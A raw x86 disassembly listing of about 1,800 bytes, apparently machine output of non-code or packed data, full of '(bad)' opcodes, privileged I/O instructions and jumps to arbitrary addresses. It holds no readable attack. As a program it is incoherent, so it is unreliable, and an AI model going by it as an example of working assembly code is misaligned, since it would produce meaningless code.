  47d590:	sahf   
  47d591:	mov    ch,0x49
  47d593:	push   edi
  47d594:	inc    edi
  47d595:	iret   
  47d596:	loop   0x47d53b
  47d598:	retf   
  47d599:	gs jne 0x47d60b
  47d59c:	imul   edx,DWORD PTR [ebx+0x1266c40],0x46a54077
  47d5a6:	cli    
  47d5a7:	inc    ebx
  47d5a8:	mov    dh,0x6a
  47d5aa:	ficom  DWORD PTR [ebp-0x10]
  47d5ad:	or     dl,BYTE PTR [esp+esi*8]
  47d5b0:	mov    ebp,0xccb30ab3
  47d5b5:	in     al,dx
  47d5b6:	pop    eax
  47d5b7:	xchg   DWORD PTR [esi+esi*1],edi
  47d5ba:	xchg   edi,eax
  47d5bb:	dec    eax
  47d5bc:	popa   
  47d5bd:	fmul   QWORD PTR ds:0xba47c04c
  47d5c3:	pop    esp
  47d5c4:	sub    DWORD PTR [ebp+0x76],eax
  47d5c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47d5c8:	into   
  47d5c9:	test   BYTE PTR [edx+0x1e],dl
  47d5cc:	pop    eax
  47d5cd:	lods   eax,DWORD PTR ds:[esi]
  47d5ce:	add    dl,0x5d
  47d5d1:	shr    ecx,0x1
  47d5d4:	push   es
  47d5d5:	mov    edi,0x981c42d2
  47d5da:	clc    
  47d5db:	pop    edi
  47d5dc:	mov    ds:0x656b5e32,al
  47d5e1:	inc    eax
  47d5e2:	imul   ecx,DWORD PTR [edx],0x31
  47d5e5:	xor    cl,BYTE PTR [ebp+0x5e]
  47d5e8:	fcmovb st,st(5)
  47d5ea:	jno    0x47d5b4
  47d5ec:	adc    al,0x77
  47d5ee:	or     al,0xc
  47d5f0:	sbb    DWORD PTR [eax],0x78
  47d5f3:	mov    esp,0x584954b8
  47d5f8:	sbb    BYTE PTR [eax-0x5],ah
  47d5fb:	(bad)  [ecx-0xfeeb9ca]
  47d601:	nop
  47d602:	dec    esi
  47d603:	mov    BYTE PTR [ebx+0x32],0x1
  47d607:	push   es
  47d608:	xor    DWORD PTR [ecx],eax
  47d60a:	hlt    
  47d60b:	sbb    eax,0xc6b7291b
  47d610:	outs   dx,DWORD PTR ds:[esi]
  47d611:	sub    BYTE PTR [eax-0x21acf81],al
  47d617:	inc    edx
  47d618:	pop    es
  47d619:	push   0xffffffa0
  47d61b:	xchg   BYTE PTR [ebp+0x10],bh
  47d61e:	adc    dl,BYTE PTR [esi-0x3b130edc]
  47d624:	adc    al,0x66
  47d626:	mov    WORD PTR [eax],es
  47d628:	adc    al,0x84
  47d62a:	or     eax,0x3bd4a4f6
  47d62f:	call   0x7486240c
  47d634:	daa    
  47d635:	adc    bl,BYTE PTR [ecx]
  47d637:	(bad)  
  47d639:	lds    edx,FWORD PTR ss:[ecx-0x40]
  47d63d:	jns    0x47d609
  47d63f:	(bad)  
  47d640:	ins    BYTE PTR es:[edi],dx
  47d641:	or     BYTE PTR [ebp+edx*4+0x410c56ca],cl
  47d648:	sub    BYTE PTR [edx+ebx*1+0x7d2e1652],bl
  47d64f:	jne    0x47d678
  47d651:	push   0xc
  47d653:	push   esi
  47d654:	fst    DWORD PTR [ebx]
  47d656:	pop    edi
  47d657:	add    DWORD PTR [ebp+0x16b4d0e0],edx
  47d65d:	push   ebp
  47d65e:	sub    bh,dh
  47d660:	jmp    0xd881:0x5840263b
  47d667:	adc    al,0xdb
  47d669:	jmp    0x47d6a5
  47d66b:	scas   eax,DWORD PTR es:[edi]
  47d66c:	jno    0x47d6b3
  47d66e:	loopne 0x47d5f8
  47d670:	pop    ebp
  47d671:	jno    0x47d605
  47d673:	push   esi
  47d674:	test   al,0xd8
  47d676:	mov    DWORD PTR [edi+edi*1+0x1045e41a],eax
  47d67d:	push   esi
  47d67e:	adc    dh,cl
  47d680:	mov    BYTE PTR [edi+0x30],0x1
  47d684:	pop    ebp
  47d685:	popf   
  47d686:	mov    dl,0x66
  47d688:	cmp    BYTE PTR [edi-0x54],cl
  47d68b:	fld    st(2)
  47d68d:	mov    WORD PTR [edx],es
  47d68f:	inc    esi
  47d690:	push   ebx
  47d691:	and    DWORD PTR [ecx+0x34],0x72e40a04
  47d698:	inc    eax
  47d699:	dec    eax
  47d69a:	mov    BYTE PTR [ebx+eiz*1],dl
  47d69d:	jmp    0xe1bc9d03
  47d6a2:	loope  0x47d62f
  47d6a4:	lods   al,BYTE PTR ds:[esi]
  47d6a5:	(bad)  [ebx]
  47d6a7:	xchg   edx,eax
  47d6a8:	push   esp
  47d6a9:	push   0x895cc0a0
  47d6ae:	sub    eax,0x82175d88
  47d6b3:	not    bl
  47d6b5:	inc    edi
  47d6b6:	pop    edi
  47d6b7:	enter  0x5c6d,0x42
  47d6bb:	mov    BYTE PTR [eax+0x70],0xf1
  47d6bf:	jg     0x47d6e7
  47d6c1:	js     0x47d6a4
  47d6c3:	jecxz  0x47d64d
  47d6c5:	inc    esi
  47d6c6:	and    dl,BYTE PTR [esi+0x7de375c6]
  47d6cc:	jmp    0x47d70e
  47d6ce:	les    edx,FWORD PTR [edi]
  47d6d0:	retf   
  47d6d1:	ds and dh,al
  47d6d4:	adc    ebp,ecx
  47d6d6:	dec    esi
  47d6d7:	dec    esp
  47d6d8:	pop    ecx
  47d6d9:	sub    ecx,eax
  47d6db:	inc    DWORD PTR [edx]
  47d6dd:	add    edx,DWORD PTR [eax-0x72]
  47d6e0:	cwde   
  47d6e1:	push   edx
  47d6e2:	pop    edi
  47d6e3:	icebp  
  47d6e4:	jns    0x47d710
  47d6e6:	pusha  
  47d6e7:	xchg   ebp,eax
  47d6e8:	mov    ecx,0x420d177f
  47d6ed:	mov    esi,0x180c2181
  47d6f2:	or     dh,BYTE PTR [eax+0x10]
  47d6f5:	scas   eax,DWORD PTR es:[edi]
  47d6f6:	dec    ebp
  47d6f7:	loopne 0x47d75a
  47d6f9:	and    BYTE PTR ds:[edx+0x18],bh
  47d6fd:	popf   
  47d6fe:	rcl    BYTE PTR [edi-0x75d122f7],1
  47d704:	push   ebp
  47d705:	je     0x47d777
  47d707:	add    eax,0x1071d428
  47d70c:	dec    esp
  47d70d:	sub    al,0x60
  47d70f:	mov    eax,ds:0xdf771019
  47d714:	dec    esp
  47d715:	or     DWORD PTR [eax],edx
  47d717:	adc    eax,0x53be1285
  47d71c:	lea    esp,[edi]
  47d71e:	in     al,dx
  47d71f:	daa    
  47d720:	ins    BYTE PTR es:[edi],dx
  47d721:	adc    edx,DWORD PTR [ecx-0x7f3dae8]
  47d727:	fstp   DWORD PTR [eax+0x772a562c]
  47d72d:	js     0x47d7a6
  47d72f:	or     eax,0x95623b89
  47d734:	pop    ebx
  47d735:	fs cwde 
  47d737:	add    al,0x72
  47d739:	sbb    BYTE PTR [ecx-0x73],dh
  47d73c:	in     eax,0x7e
  47d73e:	or     eax,0x864416b8
  47d743:	jo     0x47d79d
  47d745:	xchg   DWORD PTR [esp+edx*4],ebp
  47d748:	mov    al,0x50
  47d74a:	addr16 inc ecx
  47d74c:	jg     0x47d70e
  47d74e:	push   0xc9c64721
  47d753:	or     al,0x24
  47d755:	cdq    
  47d756:	shl    cl,0x1b
  47d759:	aaa    
  47d75a:	dec    edx
  47d75b:	cmc    
  47d75c:	pusha  
  47d75d:	pop    edx
  47d75e:	jmp    0x47d6e7
  47d760:	xlat   BYTE PTR ds:[ebx]
  47d761:	push   esp
  47d762:	push   ebp
  47d763:	adc    al,0x94
  47d765:	out    dx,al
  47d766:	test   al,0xd5
  47d768:	ror    BYTE PTR [ecx],1
  47d76a:	fadd   DWORD PTR [edx-0x7314df40]
  47d770:	loopne 0x47d6f9
  47d772:	jmp    0xe035:0xf8daa3b0
  47d779:	or     al,0x4e
  47d77b:	ffreep st(0)
  47d77d:	fild   WORD PTR [eax]
  47d77f:	scas   al,BYTE PTR es:[edi]
  47d780:	(bad)  
  47d781:	cmp    dl,BYTE PTR [esi]
  47d783:	out    dx,al
  47d784:	loopne 0x47d75b
  47d786:	loopne 0x47d7d4
  47d788:	lds    esi,FWORD PTR [ebp+0x50ceb36]
  47d78e:	add    BYTE PTR [ebx],ch
  47d790:	push   ecx
  47d791:	(bad)  
  47d792:	dec    eax
  47d793:	pop    ss
  47d794:	fs add ecx,0xffffffd5
  47d798:	adc    bl,BYTE PTR [ebx]
  47d79a:	test   al,0xab
  47d79c:	inc    ecx
  47d79d:	mov    ch,0x6f
  47d79f:	or     DWORD PTR [esi+edi*4-0x48],0xa
  47d7a4:	mov    ecx,0xe1460d08
  47d7a9:	imul   eax,ebp,0xffffff8b
  47d7ac:	pop    ebp
  47d7ad:	les    esp,FWORD PTR [edi-0xb]
  47d7b0:	fadd   st(2),st
  47d7b2:	xchg   ecx,eax
  47d7b3:	sbb    bl,BYTE PTR [esi-0x44]
  47d7b6:	push   esi
  47d7b7:	or     al,0xbe
  47d7b9:	pop    edx
  47d7ba:	and    DWORD PTR [ebp+0x66d82885],0x6500c0e
  47d7c4:	std    
  47d7c5:	jns    0x47d789
  47d7c7:	push   cs
  47d7c8:	sub    esi,0xc
  47d7cb:	pop    esi
  47d7cc:	jbe    0x47d813
  47d7ce:	inc    eax
  47d7cf:	rcl    DWORD PTR [eax-0x177716f4],0xa2
  47d7d6:	cdq    
  47d7d7:	sbb    edx,eax
  47d7d9:	add    BYTE PTR [ebx+ebp*1],bl
  47d7dc:	jne    0x47d85c
  47d7de:	les    edx,FWORD PTR [esi-0x2f47077d]
  47d7e4:	xchg   DWORD PTR [eax-0x601f6efd],ecx
  47d7ea:	xchg   edi,eax
  47d7eb:	push   ebx
  47d7ec:	mov    eax,ds:0x624a51b
  47d7f1:	in     al,0x1d
  47d7f3:	stos   BYTE PTR es:[edi],al
  47d7f4:	mov    WORD PTR [esi+edx*2+0x1c],ds
  47d7f8:	clc    
  47d7f9:	push   cs
  47d7fa:	xor    al,0xf8
  47d7fc:	or     DWORD PTR [eax],edx
  47d7fe:	aam    0x25
  47d800:	inc    edx
  47d801:	dec    ebp
  47d802:	enter  0xd965,0xed
  47d806:	xchg   BYTE PTR [edx-0x7b],dh
  47d809:	pop    eax
  47d80a:	sbb    BYTE PTR [ebx+0x68],cl
  47d80d:	cmp    al,0x84
  47d80f:	mov    ebx,0x52b94c10
  47d814:	cmp    al,0xb0
  47d816:	mul    al
  47d818:	and    ebx,edi
  47d81a:	pop    ebx
  47d81b:	pop    ds
  47d81c:	inc    ecx
  47d81d:	add    DWORD PTR [edi-0x39d8dcbc],esi
  47d823:	test   DWORD PTR [ebx-0x6b],ebp
  47d826:	loopne 0x47d7c1
  47d828:	(bad)  
  47d829:	xchg   edx,eax
  47d82a:	sub    ch,bl
  47d82c:	in     eax,dx
  47d82d:	dec    eax
  47d82e:	(bad)  
  47d82f:	neg    edx
  47d831:	sahf   
  47d832:	inc    ecx
  47d833:	adc    al,0xe
  47d835:	aas    
  47d836:	or     dh,BYTE PTR [edi+0x18]
  47d839:	dec    eax
  47d83a:	or     ah,dl
  47d83c:	mov    ch,al
  47d83e:	add    eax,DWORD PTR [ebp-0x48]
  47d841:	sbb    al,dl
  47d843:	or     edi,DWORD PTR [esi+0x74010c96]
  47d849:	sbb    eax,edi
  47d84b:	loop   0x47d84e
  47d84d:	sub    ecx,DWORD PTR [edx]
  47d84f:	sub    BYTE PTR [ebp+0x2d],dh
  47d852:	jne    0x47d8aa
  47d854:	addr16 xor eax,0x6530e8a
  47d85a:	dec    ebp
  47d85b:	sbb    eax,0xb1b36b39
  47d860:	inc    eax
  47d861:	adc    BYTE PTR [ebx],al
  47d863:	or     dl,BYTE PTR [ebp-0x1c]
  47d866:	and    eax,0xa56d0e04
  47d86b:	mov    esp,0x748378f8
  47d870:	or     al,0x42
  47d872:	hlt    
  47d873:	mov    edi,DWORD PTR [eax+0x640cc9ce]
  47d879:	or     ecx,DWORD PTR [ecx-0x48875b5e]
  47d87f:	or     al,0x4b
  47d881:	and    BYTE PTR [edi],cl
  47d883:	mov    dh,0x8
  47d885:	dec    esi
  47d886:	inc    ecx
  47d887:	add    eax,0x5487202c
  47d88c:	call   0x10eedab3
  47d891:	jbe    0x47d907
  47d893:	imul   edx,DWORD PTR [esi-0x44f58fb4],0xffffffdc
  47d89a:	mov    dl,BYTE PTR [edi-0xfd4afcf]
  47d8a0:	lahf   
  47d8a1:	xlat   BYTE PTR ds:[ebx]
  47d8a2:	fisub  WORD PTR [esi]
  47d8a4:	adc    ah,BYTE PTR [edi]
  47d8a6:	jbe    0x47d8aa
  47d8a8:	(bad)  
  47d8a9:	cli    
  47d8aa:	mov    dl,al
  47d8ac:	test   DWORD PTR [eax-0x572c96f8],edi
  47d8b2:	inc    ebx
  47d8b3:	jp     0x47d8d1
  47d8b5:	dec    esp
  47d8b6:	jns    0x47d8ac
  47d8b8:	mov    db1,ebx
  47d8bb:	mov    cl,0x81
  47d8bd:	adc    al,0x3d
  47d8bf:	mov    dl,0x44
  47d8c1:	sub    eax,DWORD PTR [eax+0x64]
  47d8c4:	shl    BYTE PTR [ebp+0xd],1
  47d8c7:	loope  0x47d8f2
  47d8c9:	jbe    0x47d942
  47d8cb:	jl     0x47d8cd
  47d8cd:	out    dx,al
  47d8ce:	(bad)  
  47d8cf:	test   eax,0x118b71ec
  47d8d4:	adc    DWORD PTR [ecx+ecx*1+0x43],edx
  47d8d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47d8d9:	into   
  47d8da:	pop    edi
  47d8db:	push   esi
  47d8dc:	dec    edx
  47d8dd:	push   esp
  47d8de:	mov    dl,0xac
  47d8e0:	and    DWORD PTR [esi+ecx*8],ebx
  47d8e3:	mov    edx,0xb029dd26
  47d8e8:	cmc    
  47d8e9:	aam    0x93
  47d8eb:	sbb    BYTE PTR [ecx],0xdc
  47d8ee:	jl     0x47d8db
  47d8f0:	and    BYTE PTR [esi+0x2a],dh
  47d8f3:	mov    ebp,ebp
  47d8f5:	xor    BYTE PTR es:[esi-0xb648dcc],cl
  47d8fc:	sahf   
  47d8fd:	shl    BYTE PTR [ecx],1
  47d8ff:	pop    ebp
  47d900:	nop
  47d901:	jmp    0x47d8ae
  47d903:	int3   
  47d904:	std    
  47d905:	pop    edi
  47d906:	adc    DWORD PTR [edi],ecx
  47d908:	mov    esi,0x5208f38c
  47d90d:	push   0xffffff8b
  47d90f:	mov    BYTE PTR [ebp-0x7c],bl
  47d912:	mov    ah,0x9f
  47d914:	(bad)  
  47d915:	jecxz  0x47d92d
  47d917:	cmp    al,0x8d
  47d919:	adc    eax,0xa943474f
  47d91e:	invd   
  47d920:	jmp    DWORD PTR [edi+0x66]
  47d923:	ret    
  47d924:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47d925:	and    al,0xcd
  47d927:	adc    DWORD PTR [edx-0x34],eax
  47d92a:	cmc    
  47d92b:	aam    0x6
  47d92d:	and    DWORD PTR cs:0x54d0e559,eax
  47d934:	dec    eax
  47d935:	push   cs
  47d936:	xchg   ebx,eax
  47d937:	or     DWORD PTR [edx],ecx
  47d939:	adc    al,BYTE PTR [edi]
  47d93b:	loopne 0x47d8f7
  47d93d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47d93e:	stos   BYTE PTR es:[edi],al
  47d93f:	int    0xe1
  47d941:	adc    eax,0x8d1d2ac1
  47d946:	ror    BYTE PTR [ecx],0x3b
  47d949:	nop
  47d94a:	add    al,bh
  47d94c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47d94d:	shl    BYTE PTR [eax+0x46],0xec
  47d951:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47d952:	mov    ecx,0xf2c8a434
  47d957:	xor    BYTE PTR [eax],ah
  47d959:	inc    edx
  47d95a:	xchg   BYTE PTR [esi+0xd],cl
  47d95d:	dec    ebp
  47d95e:	fdiv   DWORD PTR [ecx]
  47d960:	adc    DWORD PTR [edi],esi
  47d962:	sbb    BYTE PTR [edx],ch
  47d964:	inc    esi
  47d965:	in     al,dx
  47d966:	jecxz  0x47d994
  47d968:	les    esp,FWORD PTR cs:[ecx-0x14]
  47d96c:	out    0xe,al
  47d96e:	or     BYTE PTR [esi-0x13],dh
  47d971:	rcl    DWORD PTR [esp+edi*8],1
  47d974:	add    ch,BYTE PTR [esi+0x76]
  47d977:	sbb    DWORD PTR [eax+edx*8],edx
  47d97a:	adc    esp,DWORD PTR [edx+ebp*2+0x481f6c50]
  47d981:	and    BYTE PTR [ebx],dl
  47d983:	push   ss
  47d984:	fs hlt 
  47d986:	push   esp
  47d987:	push   ss
  47d988:	fs push esp
  47d98a:	and    eax,ecx
  47d98c:	fdivr  st,st(1)
  47d98e:	mov    esi,0x526db724
  47d993:	xchg   esp,eax
  47d994:	adc    DWORD PTR [eax+ebp*2],ebx
  47d997:	cs int 0xa5
  47d99a:	cwde   
  47d99b:	and    BYTE PTR [esp+0xc2888a0],bl
  47d9a2:	adc    eax,0x50fbc821
  47d9a7:	add    BYTE PTR [edi],cl
  47d9a9:	fsubr  QWORD PTR cs:[ecx-0x18]
  47d9ad:	popa   
  47d9ae:	push   0xffffff8a
  47d9b0:	mov    BYTE PTR [edi+eiz*8],ch
  47d9b3:	inc    esp
  47d9b4:	(bad)  
  47d9b6:	fwait
  47d9b7:	xor    al,0xb6
  47d9b9:	hlt    
  47d9ba:	(bad)  
  47d9bb:	push   0x19
  47d9bd:	loope  0x47d98f
  47d9bf:	mov    al,ds:0x104bdb48
  47d9c4:	mov    ah,dl
  47d9c6:	inc    edx
  47d9c7:	out    0x9c,eax
  47d9c9:	mov    ds:0xaab14106,eax
  47d9ce:	fs es js 0x47d9e0
  47d9d2:	mov    ebp,0xe936856a
  47d9d7:	push   ds
  47d9d8:	fisttp WORD PTR [ecx+0x256b9130]
  47d9de:	adc    ch,al
  47d9e0:	add    bh,BYTE PTR [eax]
  47d9e2:	and    DWORD PTR [edi+edi*2+0x2e166a66],edi
  47d9e9:	xchg   ebp,eax
  47d9ea:	test   BYTE PTR [ebp+0xd],bl
  47d9ed:	scas   al,BYTE PTR es:[edi]
  47d9ee:	mov    esp,0x89813b46
  47d9f3:	push   cs
  47d9f4:	jne    0x47d9f3
  47d9f6:	mov    ah,0xc6
  47d9f8:	fs popa 
  47d9fa:	mov    dh,0x31
  47d9fc:	dec    ebp
  47d9fd:	dec    edi
  47d9fe:	test   al,0xeb
  47da00:	dec    edx
  47da01:	(bad)  [edi+0x7e3b28f5]
  47da07:	or     ch,bl
  47da09:	stc    
  47da0a:	ret    0x1035
  47da0d:	mov    ebp,ecx
  47da0f:	mov    ah,0xc
  47da11:	and    al,0x5a
  47da13:	adc    edi,DWORD PTR [eax-0x57]
  47da16:	dec    eax
  47da17:	push   edi
  47da18:	jle    0x47da1e
  47da1a:	(bad)  
  47da1b:	adc    BYTE PTR [eax],al
  47da1d:	jo     0x47d9fa
  47da1f:	pop    es
  47da20:	sbb    eax,0x181deb0e
  47da25:	mov    bh,ah
  47da27:	push   esp
  47da28:	cmp    BYTE PTR [ecx-0x24],al
  47da2b:	or     eax,0x3791eb32
  47da30:	leave  
  47da31:	push   0x14032cb3
  47da36:	inc    edx
  47da37:	cmp    dh,BYTE PTR [esi]
  47da39:	mov    al,0x4b
  47da3b:	imul   ebx,DWORD PTR [ecx-0x5f],0xbf4c4c8c
  47da42:	pop    ss
  47da43:	cld    
  47da44:	mov    ch,0x86
  47da46:	xor    edx,DWORD PTR [edx+0x5]
  47da49:	lock addr16 ret 
  47da4c:	test   al,0x61
  47da4e:	xchg   esp,eax
  47da4f:	daa    
  47da50:	lods   al,BYTE PTR ds:[esi]
  47da51:	xchg   edi,eax
  47da52:	clc    
  47da53:	inc    ebp
  47da54:	loop   0x47da09
  47da56:	loopne 0x47da30
  47da58:	cmp    bl,al
  47da5a:	mov    BYTE PTR [esi],dl
  47da5c:	add    DWORD PTR [esi+0x28],edi
  47da5f:	add    ecx,DWORD PTR [ebp+0x13]
  47da62:	pusha  
  47da63:	stos   BYTE PTR es:[edi],al
  47da64:	sbb    al,0xa
  47da66:	adc    al,0x1b
  47da68:	fwait
  47da69:	xchg   DWORD PTR [ecx],eax
  47da6b:	(bad)  
  47da6d:	das    
  47da6e:	mov    dh,0x2
  47da70:	add    eax,0xd80f7ac9
  47da75:	add    bh,0xe
  47da78:	jo     0x47da91
  47da7a:	clc    
  47da7b:	sbb    ebp,eax
  47da7d:	jb     0x47dae1
  47da7f:	pop    esi
  47da80:	inc    edi
  47da81:	call   0x978f158f
  47da86:	fist   WORD PTR [edx+0x79]
  47da89:	add    al,0xd8
  47da8b:	(bad)  
  47da8c:	or     eax,0xc2f92cfb
  47da91:	mov    DWORD PTR [ebx],edi
  47da93:	mov    al,0xa8
  47da95:	xchg   edx,eax
  47da96:	loop   0x47dac2
  47da98:	push   esp
  47da99:	cwde   
  47da9a:	loopne 0x47da5b
  47da9c:	fild   DWORD PTR [eax+0x18]
  47da9f:	outs   dx,DWORD PTR ds:[esi]
  47daa0:	adc    BYTE PTR [edi],cl
  47daa2:	adc    BYTE PTR [ebp-0x75ade7a9],cl
  47daa8:	push   edi
  47daa9:	jo     0x47dafd
  47daab:	outs   dx,BYTE PTR ds:[esi]
  47daac:	lock imul ebp,ecx,0x9417cd96
  47dab3:	mov    cl,0xc4
  47dab5:	pop    ebp
  47dab6:	gs loope 0x47db30
  47dab9:	lea    eax,[edi-0x16]
  47dabc:	dec    edi
  47dabd:	adc    BYTE PTR [ebx-0x2c3227aa],cl
  47dac3:	ds jns 0x47dab1
  47dac6:	ja     0x47da96
  47dac8:	or     BYTE PTR ds:0xc7747514,al
  47dace:	and    edx,DWORD PTR [edi+0x5a]
  47dad1:	nop
  47dad2:	nop
  47dad3:	lea    esi,[edi-0x7e]
  47dad6:	or     BYTE PTR [edi-0x5d],bl
  47dad9:	sub    al,0xf7
  47dadb:	dec    edx
  47dadc:	test   DWORD PTR [eax],ebx
  47dade:	jmp    0x402609d
  47dae3:	sub    eax,0x477ee26e
  47dae8:	push   es
  47dae9:	xor    bh,0x87
  47daec:	adc    BYTE PTR [ebx-0x1cab1775],ah
  47daf2:	add    BYTE PTR [eax],ah
  47daf4:	or     ch,BYTE PTR [esi-0x63]
  47daf7:	xor    ecx,DWORD PTR [ebp-0x144176bb]
  47dafd:	adc    dl,BYTE PTR [ebp+ebx*1-0x5f]
  47db01:	push   edx
  47db02:	sbb    BYTE PTR [ecx],dh
  47db04:	aas    
  47db05:	ficomp DWORD PTR [edi]
  47db07:	lds    edx,FWORD PTR [edi-0xe40b8d4]
  47db0d:	and    BYTE PTR [eax+edi*1+0x4d],dh
  47db11:	enter  0x1483,0xe9
  47db15:	or     al,0x83
  47db17:	(bad)  
  47db18:	mov    DWORD PTR [eax+ecx*2+0x3b],edi
  47db1c:	ficomp WORD PTR [eax]
  47db1e:	push   es
  47db1f:	and    BYTE PTR [esi+ecx*2-0x393c8df0],cl
  47db26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47db27:	push   ecx
  47db28:	sbb    al,0x95
  47db2a:	adc    eax,0x1a7bd07f
  47db2f:	fsub   DWORD PTR [edi+0x468d28e9]
  47db35:	xor    BYTE PTR [ecx+0x7a29785a],dh
  47db3b:	or     al,0xe
  47db3d:	add    ecx,edx
  47db3f:	push   esi
  47db40:	cmp    ebp,edx
  47db42:	and    BYTE PTR [esi+ecx*2],ch
  47db45:	inc    edi
  47db46:	rol    DWORD PTR [eax],cl
  47db48:	outs   dx,DWORD PTR ds:[esi]
  47db49:	pop    ecx
  47db4a:	or     esp,ecx
  47db4c:	ficomp DWORD PTR [eax-0x5b]
  47db4f:	rcr    BYTE PTR [ebp-0x72],cl
  47db52:	and    al,0x9
  47db54:	adc    BYTE PTR es:[edx],dl
  47db57:	inc    DWORD PTR [ebx+ecx*1+0x79]
  47db5b:	fs (bad) 
  47db5d:	xlat   BYTE PTR ds:[ebx]
  47db5e:	mov    eax,edi
  47db60:	lahf   
  47db61:	sub    al,BYTE PTR [edx]
  47db63:	fmul   DWORD PTR [ebx+eax*2+0x78]
  47db67:	adc    BYTE PTR [ebx+0x6208d479],ah
  47db6d:	lock pusha 
  47db6f:	adc    eax,0x34580f5f
  47db74:	rol    edi,1
  47db76:	test   eax,0x89d57b63
  47db7b:	inc    esi
  47db7c:	lock and cl,bh
  47db7f:	jge    0x47db29
  47db81:	and    ecx,DWORD PTR [ebx+0x2f]
  47db84:	jp     0x47db7e
  47db86:	sbb    al,BYTE PTR [ebx-0x75]
  47db89:	iret   
  47db8a:	retf   
  47db8b:	xchg   ebx,eax
  47db8c:	not    DWORD PTR [esi]
  47db8e:	test   eax,0x8a203a9e
  47db93:	inc    esi
  47db94:	pop    ecx
  47db95:	iret   
  47db96:	test   esp,ebx
  47db98:	adc    ah,0x57
  47db9b:	or     esp,edi
  47db9d:	mov    edi,0x4283e86f
  47dba2:	lea    ecx,[eax+0x18]
  47dba5:	mov    al,ds:0xc0e862d7
  47dbaa:	(bad)  
  47dbab:	mov    ah,BYTE PTR cs:[ecx+0x12243e8]
  47dbb2:	rcl    DWORD PTR [eax-0x1b5ce3b1],0x99
  47dbb9:	dec    eax
  47dbba:	add    al,0x1c
  47dbbc:	or     eax,0x480124fc
  47dbc1:	add    al,BYTE PTR [edi]
  47dbc3:	mov    WORD PTR [ecx+0x4f813013],cs
  47dbc9:	aam    0xc2
  47dbcb:	push   es
  47dbcc:	and    DWORD PTR [esi+0x10b0c91c],edi
  47dbd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47dbd3:	js     0x47dbd4
  47dbd5:	xchg   esi,eax
  47dbd6:	jmp    0x47dbf8
  47dbd8:	mov    ah,BYTE PTR [esi]
  47dbda:	push   0xf4ed856c
  47dbdf:	(bad)
  47dbe2:	add    cl,dh
  47dbe4:	pushf  
  47dbe5:	or     dl,dl
  47dbe7:	push   cs
  47dbe8:	iret   
  47dbe9:	fcomp  DWORD PTR ds:0xb004e0f2
  47dbef:	dec    ecx
  47dbf0:	pop    eax
  47dbf1:	ins    BYTE PTR es:[edi],dx
  47dbf2:	(bad)  
  47dbf4:	or     cl,ah
  47dbf6:	dec    edx
  47dbf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47dbf8:	add    al,0xb5
  47dbfa:	add    bh,BYTE PTR [esi-0x15f18b37]
  47dc00:	jge    0x47db8d
  47dc02:	outs   dx,BYTE PTR ds:[esi]
  47dc03:	sub    BYTE PTR [ecx+ebx*1-0x3e],dl
  47dc07:	mov    dl,0x85
  47dc09:	mov    ebx,0x19c01848
  47dc0e:	adc    BYTE PTR [esi-0x63adafab],ch
  47dc14:	fcom   DWORD PTR [eax+0x73a64978]
  47dc1a:	cmp    BYTE PTR [ebp+0x18],0xe2
  47dc1e:	adc    eax,0xf022fa80
  47dc23:	or     BYTE PTR [eax],bh
  47dc25:	pushf  
  47dc26:	les    esp,FWORD PTR [edi+0x773eb493]
  47dc2c:	adc    BYTE PTR [ebp+0x236a8424],al
  47dc32:	hlt    
  47dc33:	add    DWORD PTR [eax],edx
  47dc35:	cmp    DWORD PTR [ecx],0xaec0d7ee
  47dc3b:	call   0xc6d4:0xa726ca6b
  47dc42:	jg     0x47dc88
  47dc44:	sbb    ch,ah
  47dc46:	int3   
  47dc47:	rol    BYTE PTR [edx+0x15],0xfe
  47dc4b:	sub    al,0x67
  47dc4d:	popf   
  47dc4e:	add    ah,cl
  47dc50:	mov    DWORD PTR [ebp+0x392a8246],esp
  47dc56:	cmp    eax,DWORD PTR [ebx]
  47dc58:	call   0x5b801e37
  47dc5d:	imul   edi,DWORD PTR ds:[ebp-0x45],0xffffffd0
  47dc62:	push   es
  47dc63:	mov    dl,BYTE PTR [eax+0x1c]
  47dc66:	or     bh,BYTE PTR [ebx]
  47dc68:	ss jae 0x47dc6f
  47dc6b:	das    
  47dc6c:	dec    eax
  47dc6d:	fadd   st,st(0)
  47dc6f:	inc    ebx
  47dc70:	arpl   WORD PTR [ebp+0x3d],si
  47dc73:	icebp  
  47dc74:	inc    ecx
  47dc75:	pop    es
  47dc76:	jge    0x47dc48
  47dc78:	adc    dh,BYTE PTR ss:[eax+esi*1-0x53]
  47dc7d:	sub    ah,BYTE PTR [esi-0x3df3358b]
  47dc83:	sub    ah,BYTE PTR [ebx+0x10]
  47dc86:	pop    ebx
  47dc87:	data16 xor BYTE PTR [ebx],dl
  47dc8a:	addr16 mov eax,0x76083e42
  47dc90:	js     0x47dca6
  47dc92:	add    BYTE PTR ds:0x7c307646,al
  47dc98:	cdq    
  47dc99:	or     al,0xc1
  47dc9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47dc9c:	inc    ebp
  47dc9d:	and    dh,BYTE PTR ds:0xc11a14bc
  47dca3:	or     BYTE PTR ds:0x848f6c0c,bh
  47dca9:	lock out 0x18,eax
  47dcac:	push   edx
  47dcad:	ds clc 
  47dcaf:	sbb    DWORD PTR [ebx+0x212774e5],edi
  47dcb5:	je     0x47dcbd
  47dcb7:	psadbw mm4,QWORD PTR [esi]
  47dcba:	dec    esp
  47dcbb:	jbe    0x47dd1f
  47dcbd:	and    BYTE PTR [ebx+0x52581847],cl
  47dcc3:	sub    DWORD PTR [edi-0x2f0dc548],esi
  47dcc9:	mov    esi,0x764f25f0
  47dcce:	xor    BYTE PTR [esi+0x4f04501e],dh
  47dcd4:	out    0x7d,eax
  47dcd6:	adc    ebp,DWORD PTR [eax-0x21f7efde]
  47dcdc:	(bad)  
  47dcdd:	pop    esi
  47dcde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47dcdf:	push   edi
  47dce0:	cmp    bl,BYTE PTR [esi+0x40]
  47dce3:	push   cs
  47dce4:	loope  0x47dd0e
  47dce6:	jle    0x47dcf8
  47dce8:	daa    
